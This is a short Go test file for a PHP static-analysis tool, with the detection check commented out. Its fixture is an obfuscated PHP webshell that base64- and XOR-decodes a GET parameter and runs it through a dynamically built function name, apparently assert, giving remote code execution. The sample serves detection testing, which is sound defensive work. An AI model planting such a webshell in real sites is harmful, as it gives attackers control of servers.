package php

import (
	"testing"
)

func TestParseSSA_Eval1(t *testing.T) {
	code := `<?php
$key = "password";
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
`
	_ = code
	//	ssatest.CheckSyntaxFlow(t, code,
	//		`
	//*_GET[*] --> * as $func
	//$func(* as $input) as $sink
	//
	//check $sink then "ok" else "no"
	//`,
	//		map[string][]string{},
	//		ssaapi.WithLanguage(ssaapi.PHP),
	//	)
}
